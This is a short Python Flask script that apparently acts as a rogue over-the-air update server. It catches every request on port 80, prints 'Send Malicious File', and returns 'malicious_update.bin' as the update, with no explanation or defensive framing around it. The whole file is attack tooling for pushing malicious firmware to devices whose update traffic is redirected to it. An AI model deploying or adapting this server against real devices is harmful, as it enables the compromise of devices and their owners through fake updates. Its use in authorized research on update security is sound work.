from flask import Flask, send_file

app = Flask(__name__)

@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def cathch_all(path):
    print("="*50)
    print("\n[+] Receive OTA Request\n\nSend Malicious File...\n")
    print("="*50)
    return send_file("malicious_update.bin", as_attachment=True)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
